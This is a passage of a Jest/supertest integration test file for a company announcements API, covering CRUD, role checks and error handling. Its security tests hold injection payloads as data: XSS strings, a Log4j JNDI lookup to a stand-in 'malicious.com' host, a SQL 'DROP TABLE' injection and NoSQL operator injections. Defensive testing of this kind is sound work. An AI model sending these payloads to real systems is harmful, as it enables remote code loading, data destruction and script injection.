const request = require('supertest');
const app = require('../../server');
const db = require('../../src/config/database');
const User = require('../../src/models/User');
const Announcement = require('../../src/models/Announcement');

describe('Company Announcements System Integration Tests', () => {
  let adminToken, employeeToken, managerToken;
  let adminUser, employeeUser, managerUser;
  let testAnnouncement;

  beforeAll(async () => {
    // Setup test users
    adminUser = await User.create({
      username: 'admin_test',
      email: 'admin@test.com',
      password: 'password123',
      role: 'admin'
    });

    employeeUser = await User.create({
      username: 'employee_test',
      email: 'employee@test.com',
      password: 'password123',
      role: 'employee'
    });

    managerUser = await User.create({
      username: 'manager_test',
      email: 'manager@test.com',
      password: 'password123',
      role: 'manager'
    });

    // Generate tokens
    const adminLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'admin@test.com', password: 'password123' });
    adminToken = adminLogin.body.token;

    const employeeLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'employee@test.com', password: 'password123' });
    employeeToken = employeeLogin.body.token;

    const managerLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'manager@test.com', password: 'password123' });
    managerToken = managerLogin.body.token;
  });

  afterAll(async () => {
    await Announcement.deleteMany({});
    await User.deleteMany({ username: { $in: ['admin_test', 'employee_test', 'manager_test'] } });
  });

  beforeEach(async () => {
    await Announcement.deleteMany({});
  });

  describe('[TC-001] Backend API endpoint tests - Happy Path and Error Path', () => {
    describe('GET /api/announcements - TC-001 Happy Path', () => {
      test('[TC-001-HP-001] should return all active announcements with proper structure', async () => {
        // Create test data
        await Announcement.create({
          title: 'Test Announcement',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body).toHaveLength(1);
        expect(response.body[0]).toHaveProperty('title', 'Test Announcement');
        expect(response.body[0]).toHaveProperty('content', 'Test content');
        expect(response.body[0]).toHaveProperty('created_at');
        expect(response.body[0]).toHaveProperty('isActive', true);
      });

      test('[TC-001-HP-002] should filter out inactive announcements', async () => {
        await Announcement.create({
          title: 'Active Announcement',
          content: 'Active content',
          createdBy: adminUser._id,
          isActive: true
        });

        await Announcement.create({
          title: 'Inactive Announcement',
          content: 'Inactive content',
          createdBy: adminUser._id,
          isActive: false
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toHaveLength(1);
        expect(response.body[0].title).toBe('Active Announcement');
      });

      test('[TC-001-HP-003] should return empty array when no active announcements exist', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toEqual([]);
      });
    });

    describe('GET /api/announcements - TC-001 Error Path', () => {
      test('[TC-001-EP-001] should return 401 when no authorization token provided', async () => {
        const response = await request(app)
          .get('/api/announcements');

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });

      test('[TC-001-EP-002] should return 403 when invalid token provided', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', 'Bearer invalid_token');

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Invalid or expired token');
      });

      test('[TC-001-EP-003] should handle database connection errors gracefully', async () => {
        const originalFind = Announcement.find;
        Announcement.find = jest.fn().mockReturnValue({
          populate: jest.fn().mockReturnValue({
            sort: jest.fn().mockRejectedValue(new Error('Database connection failed'))
          })
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(500);
        expect(response.body.error).toContain('Failed to fetch announcements');

        Announcement.find = originalFind;
      });
    });

    describe('POST /api/announcements - TC-001 Happy Path', () => {
      test('[TC-001-HP-004] should create announcement successfully with valid admin token', async () => {
        const announcementData = {
          title: 'New Company Policy',
          content: 'Important policy update for all employees'
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(announcementData);

        expect(response.status).toBe(201);
        expect(response.body.success).toBe(true);
        expect(response.body.data.title).toBe(announcementData.title);
        expect(response.body.data.content).toBe(announcementData.content);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(response.body.data.isActive).toBe(true);
      });

      test('[TC-001-HP-005] should set proper metadata on announcement creation', async () => {
        const announcementData = {
          title: 'Metadata Test',
          content: 'Testing metadata fields'
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(announcementData);

        expect(response.status).toBe(201);
        expect(response.body.data).toHaveProperty('created_at');
        expect(response.body.data).toHaveProperty('updated_at');
        expect(response.body.data).toHaveProperty('_id');
        expect(new Date(response.body.data.created_at)).toBeInstanceOf(Date);
      });
    });

    describe('POST /api/announcements - TC-001 Error Path', () => {
      test('[TC-001-EP-004] should return 403 when non-admin tries to create announcement', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Unauthorized Announcement',
            content: 'Should not be allowed'
          });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-EP-005] should return 400 when required fields are missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: '' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Validation errors');
      });

      test('[TC-001-EP-006] should return 400 when content contains malicious scripts', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Test Title',
            content: '<script>alert("xss")</script>'
          });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Invalid content format');
      });

      test('[TC-001-EP-007] should handle database save failures', async () => {
        const originalCreate = Announcement.create;
        Announcement.create = jest.fn().mockRejectedValue(new Error('Database save failed'));

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Test Announcement',
            content: 'Test content'
          });

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to create announcement');

        Announcement.create = originalCreate;
      });
    });

    describe('GET /api/announcements/admin - TC-001 Happy Path', () => {
      test('[TC-001-HP-006] should return all announcements including inactive for admin', async () => {
        await Announcement.create({
          title: 'Active Announcement',
          content: 'Active content',
          createdBy: adminUser._id,
          isActive: true
        });

        await Announcement.create({
          title: 'Inactive Announcement',
          content: 'Inactive content',
          createdBy: adminUser._id,
          isActive: false
        });

        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toHaveLength(2);
        const titles = response.body.map(a => a.title);
        expect(titles).toContain('Active Announcement');
        expect(titles).toContain('Inactive Announcement');
      });

      test('[TC-001-HP-007] should return populated createdBy field for admin view', async () => {
        await Announcement.create({
          title: 'Admin View Test',
          content: 'Testing admin view',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body[0]).toHaveProperty('createdBy');
        expect(response.body[0].createdBy).toHaveProperty('username', 'admin_test');
      });
    });

    describe('GET /api/announcements/admin - TC-001 Error Path', () => {
      test('[TC-001-EP-008] should return 403 when non-admin accesses admin endpoint', async () => {
        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-EP-009] should handle database errors in admin endpoint', async () => {
        const originalFind = Announcement.find;
        Announcement.find = jest.fn().mockReturnValue({
          populate: jest.fn().mockReturnValue({
            sort: jest.fn().mockRejectedValue(new Error('Database query failed'))
          })
        });

        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(500);
        expect(response.body.error).toContain('Internal server error');

        Announcement.find = originalFind;
      });
    });

    describe('PUT /api/announcements/:id - TC-001 Happy Path', () => {
      test('[TC-001-HP-008] should update announcement successfully', async () => {
        const announcement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });

        const updateData = {
          title: 'Updated Title',
          content: 'Updated content'
        };

        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send(updateData);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.data.title).toBe('Updated Title');
        expect(response.body.data.content).toBe('Updated content');
      });

      test('[TC-001-HP-009] should preserve system fields during update', async () => {
        const announcement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated Title',
            content: 'Updated content',
            createdBy: employeeUser._id, // Should be ignored
            created_at: new Date('2020-01-01') // Should be ignored
          });

        expect(response.status).toBe(200);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
      });
    });

    describe('PUT /api/announcements/:id - TC-001 Error Path', () => {
      test('[TC-001-EP-010] should return 404 when announcement not found', async () => {
        const response = await request(app)
          .put('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
      });

      test('[TC-001-EP-011] should return 400 for invalid ObjectId format', async () => {
        const response = await request(app)
          .put('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-001-EP-012] should return 403 when non-admin tries to update', async () => {
        const announcement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Unauthorized Update' });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });
    });

    describe('DELETE /api/announcements/:id - TC-001 Happy Path', () => {
      test('[TC-001-HP-010] should delete announcement successfully', async () => {
        const announcement = await Announcement.create({
          title: 'To Be Deleted',
          content: 'Delete me',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .delete(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);

        // Verify announcement is deleted
        const deletedAnnouncement = await Announcement.findById(announcement._id);
        expect(deletedAnnouncement).toBeNull();
      });

      test('[TC-001-HP-011] should remove announcement from public view immediately', async () => {
        const announcement = await Announcement.create({
          title: 'Public Announcement',
          content: 'Visible to all',
          createdBy: adminUser._id,
          isActive: true
        });

        // Delete announcement
        await request(app)
          .delete(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        // Check public view
        const publicResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(publicResponse.status).toBe(200);
        expect(publicResponse.body).toHaveLength(0);
      });
    });

    describe('DELETE /api/announcements/:id - TC-001 Error Path', () => {
      test('[TC-001-EP-013] should return 404 when trying to delete non-existent announcement', async () => {
        const response = await request(app)
          .delete('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
      });

      test('[TC-001-EP-014] should return 400 for invalid ObjectId in delete', async () => {
        const response = await request(app)
          .delete('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-001-EP-015] should return 403 when non-admin tries to delete', async () => {
        const announcement = await Announcement.create({
          title: 'Protected Announcement',
          content: 'Cannot be deleted by non-admin',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .delete(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });
    });

    describe('TC-001 Security and Input Validation Tests', () => {
      test('[TC-001-SEC-001] should sanitize malicious input in announcement creation', async () => {
        const maliciousInputs = [
          {
            title: '<script>alert("XSS")</script>',
            content: 'Normal content',
            expectedStatus: 400
          },
          {
            title: 'Normal title',
            content: '<img src=x onerror=alert("XSS")>',
            expectedStatus: 400
          },
          {
            title: '${jndi:ldap://malicious.com/a}',
            content: 'Log4j injection attempt',
            expectedStatus: 400
          },
          {
            title: "'; DROP TABLE announcements; --",
            content: 'SQL injection attempt',
            expectedStatus: 400
          }
        ];

        for (const input of maliciousInputs) {
          const response = await request(app)
            .post('/api/announcements')
            .set('Authorization', `Bearer ${adminToken}`)
            .send(input);

          expect(response.status).toBe(input.expectedStatus);
          if (response.status === 400) {
            expect(response.body.message).toContain('Invalid content format');
          }
        }
      });

      test('[TC-001-SEC-002] should validate request size limits', async () => {
        const oversizedPayload = {
          title: 'A'.repeat(10000),
          content: 'B'.repeat(100000)
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(oversizedPayload);

        expect([400, 413]).toContain(response.status);
      });

      test('[TC-001-SEC-003] should prevent NoSQL injection in query parameters', async () => {
        const maliciousQueries = [
          { id: '{"$ne": null}' },
          { id: '{"$regex": ".*"}' },
          { id: '{"$where": "this.title.length > 0"}' }
        ];

        for (const query of maliciousQueries) {
          const response = await request(app)
            .get(`/api/announcements/${query.id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect([400, 404]).toContain(response.status);
        }
      });

      test('[TC-001-SEC-004] should handle concurrent unauthorized access attempts', async () => {
        const maliciousRequests = Array.from({ length: 5 }, () =>
          request(app)
            .post('/api/announcements')
            .set('Authorization', 'Bearer fake_token')
            .send({ title: 'Attack', content: 'Attack' })
        );

        const responses = await Promise.all(maliciousRequests);
        
        responses.forEach(response => {
          expect(response.status).toBe(403);
          expect(response.body.error).toBe('Invalid or expired token');
        });
      });
    });

    describe('TC-001 Cross-endpoint Integration and Data Consistency', () => {
      test('[TC-001-INT-001] should maintain data consistency across all CRUD operations', async () => {
        // Create announcement
        const createResponse = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Integration Test',
            content: 'Testing cross-endpoint consistency'
          });

        expect(createResponse.status).toBe(201);
        const announcementId = createResponse.body.data._id;

        // Verify creation in public view
        const publicView = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(publicView.status).toBe(200);
        expect(publicView.body).toHaveLength(1);
        expect(publicView.body[0]._id).toBe(announcementId);

        // Update announcement
        const updateResponse = await request(app)
          .put(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated Integration Test' });

        expect(updateResponse.status).toBe(200);

        // Verify update in public view
        const updatedPublicView = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(updatedPublicView.status).toBe(200);
        expect(updatedPublicView.body[0].title).toBe('Updated Integration Test');

        // Delete announcement
        const deleteResponse = await request(app)
          .delete(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(deleteResponse.status).toBe(200);

        // Verify deletion in public view
        const finalPublicView = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(finalPublicView.status).toBe(200);
        expect(finalPublicView.body).toHaveLength(0);
      });

      test('[TC-001-INT-002] should maintain consistent response format across all endpoints', async () => {
        const announcement = await Announcement.create({
          title: 'Format Test',
          content: 'Testing response format',
          createdBy: adminUser._id,
          isActive: true
        });

        // Test GET format
        const getResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(getResponse.status).toBe(200);
        expect(Array.isArray(getResponse.body)).toBe(true);

        // Test POST format
        const postResponse = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Format Test 2', content: 'Test content' });

        expect(postResponse.status).toBe(201);
        expect(postResponse.body).toHaveProperty('success', true);
        expect(postResponse.body).toHaveProperty('data');

        // Test PUT format
        const putResponse = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated Format Test' });

        expect(putResponse.status).toBe(200);
        expect(putResponse.body).toHaveProperty('success', true);
        expect(putResponse.body).toHaveProperty('data');

        // Test DELETE format
        const deleteResponse = await request(app)
          .delete(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(deleteResponse.status).toBe(200);
        expect(deleteResponse.body).toHaveProperty('success', true);
      });
    });

    describe('TC-001 Error Handling and Edge Cases', () => {
      test('[TC-001-ERR-001] should handle malformed Bearer tokens', async () => {
        const malformedTokens = [
          'Bearer',
          'Bearer ',
          'bearer valid_token',
          'Basic dGVzdDp0ZXN0',
          'Invalid format'
        ];

        for (const token of malformedTokens) {
          const response = await request(app)
            .get('/api/announcements')
            .set('Authorization', token);

          expect([401, 403]).toContain(response.status);
        }
      });

      test('[TC-001-ERR-002] should handle database timeout scenarios', async () => {
        const originalFind = Announcement.find;
        Announcement.find = jest.fn().mockReturnValue({
          populate: jest.fn().mockReturnValue({
            sort: jest.fn().mockImplementation(() => {
              return new Promise((_, reject) => {
                setTimeout(() => reject(new Error('Database timeout')), 100);
              });
            })
          })
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(500);
        expect(response.body.error).toContain('Failed to fetch announcements');

        Announcement.find = originalFind;
      });

      test('[TC-001-ERR-003] should validate ObjectId format in all parameters', async () => {
        const invalidIds = ['invalid', '123', 'not-an-objectid', ''];

        for (const id of invalidIds) {
          const putResponse = await request(app)
            .put(`/api/announcements/${id}`)
            .set('Authorization', `Bearer ${adminToken}`)
            .send({ title: 'Test', content: 'Test' });

          const deleteResponse = await request(app)
            .delete(`/api/announcements/${id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect(putResponse.status).toBe(400);
          expect(putResponse.body.message).toContain('Invalid ID format');
          
          expect(deleteResponse.status).toBe(400);
          expect(deleteResponse.body.message).toContain('Invalid ID format');
        }
      });

      test('[TC-001-ERR-004] should handle concurrent database operations gracefully', async () => {
        const announcement = await Announcement.create({
          title: 'Concurrent Test',
          content: 'Testing concurrent operations',
          createdBy: adminUser._id,
          isActive: true
        });

        // Perform concurrent operations
        const operations = [
          request(app)
            .put(`/api/announcements/${announcement._id}`)
            .set('Authorization', `Bearer ${adminToken}`)
            .send({ title: 'Updated 1' }),
          request(app)
            .put(`/api/announcements/${announcement._id}`)
            .set('Authorization', `Bearer ${adminToken}`)
            .send({ title: 'Updated 2' }),
          request(app)
            .get(`/api/announcements/${announcement._id}`)
            .set('Authorization', `Bearer ${employeeToken}`)
        ];

        const responses = await Promise.all(operations);
        
        // At least some operations should succeed
        const successfulOps = responses.filter(r => r.status < 400);
        expect(successfulOps.length).toBeGreaterThan(0);
      });
    });

    describe('TC-001 Performance and Load Testing', () => {
      test('[TC-001-PERF-001] should handle multiple concurrent read requests efficiently', async () => {
        // Create test data
        await Announcement.create({
          title: 'Performance Test',
          content: 'Testing concurrent reads',
          createdBy: adminUser._id,
          isActive: true
        });

        const concurrentRequests = Array.from({ length: 10 }, () =>
          request(app)
            .get('/api/announcements')
            .set('Authorization', `Bearer ${employeeToken}`)
        );

        const startTime = Date.now();
        const responses = await Promise.all(concurrentRequests);
        const endTime = Date.now();

        // All requests should succeed
        responses.forEach(response => {
          expect(response.status).toBe(200);
          expect(response.body).toHaveLength(1);
        });

        // Should complete within reasonable time
        expect(endTime - startTime).toBeLessThan(2000);
      });

      test('[TC-001-PERF-002] should handle large dataset retrieval efficiently', async () => {
        // Create multiple announcements
        const announcements = Array.from({ length: 20 }, (_, i) => ({
          title: `Announcement ${i + 1}`,
          content: `Content for announcement ${i + 1}`,
          createdBy: adminUser._id,
          isActive: true
        }));

        await Announcement.insertMany(announcements);

        const startTime = Date.now();
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);
        const endTime = Date.now();

        expect(response.status).toBe(200);
        expect(response.body.length).toBe(20);
        expect(endTime - startTime).toBeLessThan(1000);
      });
    });
  });

  describe('[TC-003] Integration testing for API endpoints', () => {
    describe('GET /api/announcements - Happy Path', () => {
      test('[TC-003-HP-001] should return all active announcements with proper structure', async () => {
        // Create test data
        await Announcement.create({
          title: 'Test Announcement',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body).toHaveLength(1);
        expect(response.body[0]).toHaveProperty('title', 'Test Announcement');
        expect(response.body[0]).toHaveProperty('content', 'Test content');
        expect(response.body[0]).toHaveProperty('created_at');
        expect(response.body[0]).toHaveProperty('isActive', true);
      });

      test('[TC-003-HP-002] should filter out inactive announcements', async () => {
        await Announcement.create({
          title: 'Active Announcement',
          content: 'Active content',
          createdBy: adminUser._id,
          isActive: true
        });

        await Announcement.create({
          title: 'Inactive Announcement',
          content: 'Inactive content',
          createdBy: adminUser._id,
          isActive: false
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toHaveLength(1);
        expect(response.body[0].title).toBe('Active Announcement');
      });

      test('[TC-003-HP-003] should return empty array when no active announcements exist', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toEqual([]);
      });
    });

    describe('GET /api/announcements - Error Path', () => {
      test('[TC-003-EP-001] should return 401 when no authorization token provided', async () => {
        const response = await request(app)
          .get('/api/announcements');

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });

      test('[TC-003-EP-002] should return 403 when invalid token provided', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', 'Bearer invalid_token');

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Invalid or expired token');
      });

      test('[TC-003-EP-003] should handle database connection errors gracefully', async () => {
        const originalFind = Announcement.find;
        Announcement.find = jest.fn().mockReturnValue({
          populate: jest.fn().mockReturnValue({
            sort: jest.fn().mockRejectedValue(new Error('Database connection failed'))
          })
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(500);
        expect(response.body.error).toContain('Failed to fetch announcements');

        Announcement.find = originalFind;
      });
    });

    describe('POST /api/announcements - Happy Path', () => {
      test('[TC-003-HP-004] should create announcement successfully with valid admin token', async () => {
        const announcementData = {
          title: 'New Company Policy',
          content: 'Important policy update for all employees'
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(announcementData);

        expect(response.status).toBe(201);
        expect(response.body.success).toBe(true);
        expect(response.body.data.title).toBe(announcementData.title);
        expect(response.body.data.content).toBe(announcementData.content);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(response.body.data.isActive).toBe(true);
      });

      test('[TC-003-HP-005] should set proper metadata on announcement creation', async () => {
        const announcementData = {
          title: 'Metadata Test',
          content: 'Testing metadata fields'
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(announcementData);

        expect(response.status).toBe(201);
        expect(response.body.data).toHaveProperty('created_at');
        expect(response.body.data).toHaveProperty('updated_at');
        expect(response.body.data).toHaveProperty('_id');
        expect(new Date(response.body.data.created_at)).toBeInstanceOf(Date);
      });
    });

    describe('POST /api/announcements - Error Path', () => {
      test('[TC-003-EP-004] should return 403 when non-admin tries to create announcement', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Unauthorized Announcement',
            content: 'Should not be allowed'
          });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-003-EP-005] should return 400 when required fields are missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: '' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Validation errors');
      });

      test('[TC-003-EP-006] should return 400 when content contains malicious scripts', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Test Title',
            content: '<script>alert("xss")</script>'
          });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Invalid content format');
      });

      test('[TC-003-EP-007] should handle database save failures', async () => {
        const originalCreate = Announcement.create;
        Announcement.create = jest.fn().mockRejectedValue(new Error('Database save failed'));

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Test Announcement',
            content: 'Test content'
          });

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to create announcement');

        Announcement.create = originalCreate;
      });
    });

    describe('GET /api/announcements/admin - Happy Path', () => {
      test('[TC-003-HP-006] should return all announcements including inactive for admin', async () => {
        await Announcement.create({
          title: 'Active Announcement',
          content: 'Active content',
          createdBy: adminUser._id,
          isActive: true
        });

        await Announcement.create({
          title: 'Inactive Announcement',
          content: 'Inactive content',
          createdBy: adminUser._id,
          isActive: false
        });

        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toHaveLength(2);
        const titles = response.body.map(a => a.title);
        expect(titles).toContain('Active Announcement');
        expect(titles).toContain('Inactive Announcement');
      });

      test('[TC-003-HP-007] should return populated createdBy field for admin view', async () => {
        await Announcement.create({
          title: 'Admin View Test',
          content: 'Testing admin view',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body[0]).toHaveProperty('createdBy');
        expect(response.body[0].createdBy).toHaveProperty('username', 'admin_test');
      });
    });

    describe('GET /api/announcements/admin - Error Path', () => {
      test('[TC-003-EP-008] should return 403 when non-admin accesses admin endpoint', async () => {
        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-003-EP-009] should handle database errors in admin endpoint', async () => {
        const originalFind = Announcement.find;
        Announcement.find = jest.fn().mockReturnValue({
          populate: jest.fn().mockReturnValue({
            sort: jest.fn().mockRejectedValue(new Error('Database query failed'))
          })
        });

        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(500);
        expect(response.body.error).toContain('Internal server error');

        Announcement.find = originalFind;
      });
    });

    describe('PUT /api/announcements/:id - Happy Path', () => {
      test('[TC-003-HP-008] should update announcement successfully', async () => {
        const announcement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });

        const updateData = {
          title: 'Updated Title',
          content: 'Updated content'
        };

        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send(updateData);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.data.title).toBe('Updated Title');
        expect(response.body.data.content).toBe('Updated content');
      });

      test('[TC-003-HP-009] should preserve system fields during update', async () => {
        const announcement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated Title',
            content: 'Updated content',
            createdBy: employeeUser._id, // Should be ignored
            created_at: new Date('2020-01-01') // Should be ignored
          });

        expect(response.status).toBe(200);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
      });
    });

    describe('PUT /api/announcements/:id - Error Path', () => {
      test('[TC-003-EP-010] should return 404 when announcement not found', async () => {
        const response = await request(app)
          .put('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
      });

      test('[TC-003-EP-011] should return 400 for invalid ObjectId format', async () => {
        const response = await request(app)
          .put('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-003-EP-012] should return 403 when non-admin tries to update', async () => {
        const announcement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
